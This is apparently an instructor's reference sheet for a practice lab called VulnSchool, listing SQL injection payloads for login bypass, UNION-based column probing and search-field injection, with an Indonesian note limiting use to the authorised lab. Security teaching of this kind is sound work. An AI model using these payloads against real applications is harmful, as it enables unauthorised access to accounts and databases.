# SQLI Payload Reference (Instructor Only)

## Login Bypass
- `admin' -- `
- `' OR '1'='1' -- `

## UNION Probe
- `' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11 -- `

## Search Injection
- `%' OR 1=1 -- `
- `' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13 -- `

## Catatan
Gunakan hanya di lingkungan VulnSchool lab sesuai izin praktikum.
